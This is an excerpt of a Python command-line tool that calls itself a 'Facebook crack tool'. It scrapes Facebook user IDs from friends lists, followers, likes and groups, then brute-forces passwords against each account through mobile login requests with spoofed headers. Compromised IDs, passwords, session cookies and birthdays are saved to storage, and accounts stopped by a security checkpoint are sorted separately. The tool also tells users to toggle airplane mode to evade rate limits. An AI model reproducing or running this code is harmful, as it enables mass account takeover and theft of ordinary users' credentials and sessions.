...
def banner():
	clear()
	wel='# KABIR FACEBOOK CRACK TOOL'
	cik2=mark(wel ,style='red')
	sol().print(cik2)


	ban='''KABIR SINGH-XD
      Facebook:  KABIRSINGH2119
   Youtube: KABIR TECH
    AUTHOR:  KABIR SINGH
     NOTE:    FOR FREE USE'''
...
def login_lagi334():
	banner()
	sky = '[bold cyan][01] LOGIN With Cookies  01\n[02] LOGIN COOKIE VERSI 02[/bold cyan]'
...
def menu(my_name,my_id):
	...
	io = '''[bold green][01] DUMP FRINDS ID PUBLIC	    
[02] DUMP ID PUBLIC (Login)   	
[03] DUMP ID FOLLOWERS	 [bold red]
[04] DUMP ID LIKES
[05] DUMP ID GROUP 
[06] DUMP ID FILE  [bold cyan]
[07] CHECK ID FILE 
[08] CHECK RESULT
[09] HOW TO CRATE A TOKEN [bold red]
[00] EXIT (LOL FUCK OFF)
 [bold cyan]'''
	oi = nel(io, style='blue')
	cetak(nel(oi, title='[bold cyan] • MENU CRACK • [/bold cyan]'))
	ec = input(x+'['+p+'<>'+x+'] Choose : ')
	if ec in ['1','01']:
		dump_publik()
	elif ec in ['2','02']:
		dump_massal()
		...
		os.system('xdg-open https://youtu.be/0E836lgf_5o')
	elif ec in ['0','00']:
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/KABIR-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/KABIR-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/KABIR-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/KABIR-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/KABIR-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/KABIR-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/KABIR-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/KABIR-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/KABIR-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
# DUMP ID UNLIMITED
def dump_massal():
	mas='[01] CRACK WITH FILE\n[02] CRACK FREE(PER ID)'
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] INPUT THE TOTAL LIMIT THIS IS THE MAX [20]')
		try:
		...
		for met in range(jum):
			...
			uid.append(kl)
	sed='# PATIENT IS COLLECTING ID'
	sol().print(mark(sed, style='red'))
	for userr in uid:
		dumpdump(userr)
	tot = '# SUCCESSFUL DUMPED  %s ID'%(len(id))
	if len(id)==0:
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/KABIR-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/KABIR-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/KABIR-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def setting():
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	guw = '# DISPLAYING CHECKPOINT OPTIONS ? (y/t)'
	...
	guw = '# DISPLAYING CEKPOIN RESULTS ? (y/t)'
	...
	if cpres in ['y','Y']:
		...
		princp.append('no')
	guw = '# ADDING ADDITIONAL PASSWORD ? (y/t)'
	sol().print(mark(guw, style='yellow'))
...
def passwrd():
	...
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/KABIR-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/KABIR-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
...
#tapyes			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					try:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}\n[•] BIRTHDAY : {ttl}'
						open('/sdcard/KABIR-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
					except:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
						open('/sdcard/KABIR-DATA/OK/'+cpc,'a').write(idf+'|'+pw+'\n')
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/KABIR-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					...
					cetak(nel(statusok1, title='[bold green]KABIR-XZY LIVE[/bold green]'))
					ok+=1
					break
...
def crackfree(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s KABIR %s/%s [ LIVE:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='KABIR CP'))
					open('/sdcard/KABIR-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='KABIR LIVE'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]KABIR LIVE[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]KABIR OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					...
					if opsinya=='':
						try:
							open('/sdcard/KABIR-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
						except:
							open('/sdcard/KABIR-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/KABIR-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/KABIR-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
					statusok1 = nel(statusok, style='yellow')
					cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				except:
					li = '# CANNOT CHECK OPTIONS'
				...
				statusok1 = nel(statusok, style='yellow')
				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				open('/sdcard/KABIR-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/KABIR-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/KABIR-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/KABIR-DATA/DUMP')
	except:pass
	login()
